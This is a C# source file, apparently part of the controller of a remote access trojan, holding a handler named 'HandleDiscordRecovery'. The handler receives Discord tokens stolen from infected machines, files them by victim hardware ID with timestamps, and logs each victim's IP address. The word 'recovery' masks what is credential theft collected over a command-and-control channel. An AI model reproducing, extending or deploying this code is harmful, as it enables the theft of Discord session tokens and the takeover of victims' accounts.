using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleDiscordRecovery
    {
        public HandleDiscordRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Discord");
                string tokens = unpack_msgpack.ForcePathObject("Tokens").AsString;
                if (!string.IsNullOrWhiteSpace(tokens))
                {
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    File.WriteAllText(fullPath + "\\Tokens_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", tokens.Replace("\n", Environment.NewLine));
                    new HandleLogs().Addmsg($"Client {client.Ip} discord recovery success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Discord", Color.Purple);
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} discord recovery error", Color.MediumPurple);
                }
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}